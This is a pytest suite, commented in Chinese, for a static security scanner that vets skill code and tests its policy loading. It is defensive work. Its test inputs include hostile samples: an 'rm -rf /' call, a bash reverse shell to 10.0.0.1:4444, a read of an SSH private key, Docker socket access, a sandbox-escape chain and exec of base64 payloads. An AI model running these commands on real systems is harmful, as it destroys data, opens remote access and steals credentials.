"""靜態安全掃描的測試。

這些測試守的是兩個方向：真正危險的東西必須被抓到，而正常的技能程式碼不能被
誤殺。第二個方向同樣重要 —— 一個到處誤報的掃描器，最後的下場是被人設成
SCANNER_ENFORCE=0，等於整層防禦消失。
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app import scanner

POLICY_FILE = Path(__file__).resolve().parent.parent / "policy.yaml"


@pytest.fixture(scope="module")
def policy() -> dict:
    """用正式環境實際使用的那份 policy.yaml，不是測試專用的簡化版。"""
    loaded = scanner.load_policy(POLICY_FILE)
    # 確認真的讀到檔案，而不是靜默退回後備政策 —— 否則這整組測試會變成在
    # 測後備政策，policy.yaml 壞掉也不會有人發現。
    assert "crontab-persistence" in {
        p.get("name") for p in loaded["denied_patterns"]
    }, "沒有載入到 policy.yaml，退回了後備政策"
    return loaded


def rules(findings) -> set[str]:
    return {f.rule for f in findings}


# --- 必須抓到的東西 --------------------------------------------------------


@pytest.mark.parametrize(
    ("source", "why"),
    [
        ("import subprocess\nsubprocess.run(['ls'])", "執行外部程式"),
        ("import os\nos.system('rm -rf /')", "os.system"),
        ("eval(user_input)", "動態執行"),
        ("exec(compile(src, '<s>', 'exec'))", "exec + compile"),
        ("import ctypes", "原生程式碼介面"),
        ("import socket", "原始網路"),
        ("import pickle\npickle.loads(blob)", "反序列化"),
        ("obj.__class__.__bases__[0].__subclasses__()", "沙箱逃逸的經典爬鏈"),
        ("f.__globals__['__builtins__']", "取回 builtins"),
        ("import shutil\nshutil.rmtree('/opt/data')", "遞迴刪除"),
        ("getattr(obj, name)()", "動態屬性查表"),
        ("import base64\nexec(base64.b64decode(blob))", "編碼過的 payload"),
        ("open('/var/run/docker.sock')", "碰 Docker 控制層"),
        ("open('/home/u/.ssh/id_rsa').read()", "讀憑證"),
        ("os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')", "反向 shell"),
    ],
)
def test_dangerous_code_is_flagged(source: str, why: str, policy: dict) -> None:
    findings = scanner.scan_source(source, "evil.py", policy)
    assert findings, f"沒有抓到：{why}"


def test_from_import_bypass_is_caught(policy: dict) -> None:
    """`from os import system` 之後直接呼叫 system() —— 點分名稱就不見了。"""
    findings = scanner.scan_source(
        "from os import system\nsystem('id')", "sneaky.py", policy
    )
    assert "denied-import" in rules(findings)
    # 呼叫端也應該被獨立抓到，這樣即使有人放寬了 import 規則仍然擋得住。
    assert "denied-call" in rules(findings)


def test_syntax_error_is_rejected(policy: dict) -> None:
    """解析不了的檔案就審查不了，直接拒絕。"""
    findings = scanner.scan_source("def broken(:\n    pass", "bad.py", policy)
    assert [f.rule for f in findings] == ["syntax"]


def test_findings_carry_line_numbers(policy: dict) -> None:
    """報告要能指到出問題的那一行，否則人工複查等於重看一遍全部程式碼。"""
    source = "import json\n\n\nimport subprocess\n"
    findings = scanner.scan_source(source, "x.py", policy)
    assert findings[0].line == 4


# --- 不能誤殺的東西 --------------------------------------------------------


def test_ordinary_skill_code_is_clean(policy: dict) -> None:
    source = '''
"""A perfectly ordinary skill."""
import json
import os
import re
from pathlib import Path

import httpx


def load(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def fetch(url: str, token: str) -> dict:
    resp = httpx.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=30)
    resp.raise_for_status()
    return resp.json()


def normalise(name: str) -> str:
    return re.sub(r"\\s+", "-", name.strip().lower())


class Report:
    def __init__(self, rows: list[dict]) -> None:
        self.rows = rows

    def summary(self) -> str:
        return f"{len(self.rows)} rows from {os.environ.get('SOURCE', 'unknown')}"
'''
    findings = scanner.scan_source(source, "skill.py", policy)
    assert findings == [], f"誤殺了正常程式碼：{[f.detail for f in findings]}"


def test_literal_getattr_is_allowed(policy: dict) -> None:
    """getattr(obj, "attr") 是常見且無害的寫法；只有非字面值才可疑。"""
    findings = scanner.scan_source('getattr(obj, "value", None)', "ok.py", policy)
    assert findings == []


# --- 產物層級的行為 --------------------------------------------------------


def test_non_python_files_are_skipped_not_scanned(policy: dict) -> None:
    report = scanner.scan_artifacts(
        {
            "SKILL.md": b"---\nname: x\n---\nRun `subprocess.run` never.\n",
            "data.json": b'{"eval": "exec"}',
        },
        policy,
    )
    assert report.clean
    assert report.files_scanned == 0
    assert sorted(report.files_skipped) == ["SKILL.md", "data.json"]


def test_oversized_file_is_flagged(policy: dict) -> None:
    payload = b"x = 1\n" * 200_000  # 遠超過 512KB
    report = scanner.scan_artifacts({"big.py": payload}, policy)
    assert not report.clean
    assert rules(report.findings) == {"size"}


def test_non_utf8_python_is_flagged(policy: dict) -> None:
    report = scanner.scan_artifacts({"weird.py": b"\xff\xfe\x00binary"}, policy)
    assert not report.clean
    assert rules(report.findings) == {"encoding"}


# --- 政策載入 --------------------------------------------------------------


def test_missing_policy_falls_back_to_strict(tmp_path: Path) -> None:
    """讀不到政策檔時必須退回嚴格模式，而不是「沒有規則」。"""
    loaded = scanner.load_policy(tmp_path / "nope.yaml")
    assert "subprocess" in loaded["denied_imports"]
    assert "eval" in loaded["denied_calls"]


def test_partial_policy_merges_over_fallback(tmp_path: Path) -> None:
    """政策檔只覆寫一個鍵，其他鍵必須維持後備的嚴格值。"""
    partial = tmp_path / "partial.yaml"
    partial.write_text("denied_imports:\n  - json\n", encoding="utf-8")

    loaded = scanner.load_policy(partial)
    assert loaded["denied_imports"] == ["json"]        # 被覆寫
    assert "eval" in loaded["denied_calls"]            # 沿用後備
    assert loaded["max_file_bytes"] == 512 * 1024      # 沿用後備


def test_broken_policy_yaml_falls_back(tmp_path: Path) -> None:
    broken = tmp_path / "broken.yaml"
    broken.write_text("denied_imports: [unclosed\n", encoding="utf-8")

    loaded = scanner.load_policy(broken)
    assert "subprocess" in loaded["denied_imports"]


def test_shipped_policy_is_at_least_as_strict_as_fallback() -> None:
    """policy.yaml 不該比內建後備寬鬆。

    這個測試存在的理由：有人為了讓某個技能過關而刪掉 policy.yaml 裡的規則
    時，應該要有東西擋下來，而不是靜默地降低整個系統的防護。
    """
    shipped = scanner.load_policy(POLICY_FILE)
    fallback = scanner._FALLBACK_POLICY

    for key in ("denied_imports", "denied_calls", "denied_attributes"):
        missing = set(fallback[key]) - set(shipped[key])
        assert not missing, f"policy.yaml 的 {key} 少了後備政策有的項目：{sorted(missing)}"

    assert shipped["max_file_bytes"] <= fallback["max_file_bytes"]
